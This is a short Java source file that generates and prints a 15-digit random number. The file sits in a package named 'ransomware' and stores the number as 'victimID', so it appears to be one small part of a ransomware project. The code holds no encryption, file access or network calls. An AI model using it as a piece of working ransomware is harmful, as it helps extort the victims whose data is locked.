package com.margarito.ransomware;
import java.util.Random;

public class RandomNumberGenerator {
    public static void main(String[] args) {
        // Generate a 15-character random number
        String victimID = generateRandomNumber(15);
        System.out.println("Generated 15-character random number: " + victimID);
    }

    public static String generateRandomNumber(int length) {
        StringBuilder number = new StringBuilder();
        Random random = new Random();

        // Ensure the first digit is not 0
        number.append(random.nextInt(9) + 1);

        // Append the remaining digits
        for (int i = 1; i < length; i++) {
            number.append(random.nextInt(10));
        }

        return number.toString();
    }
}
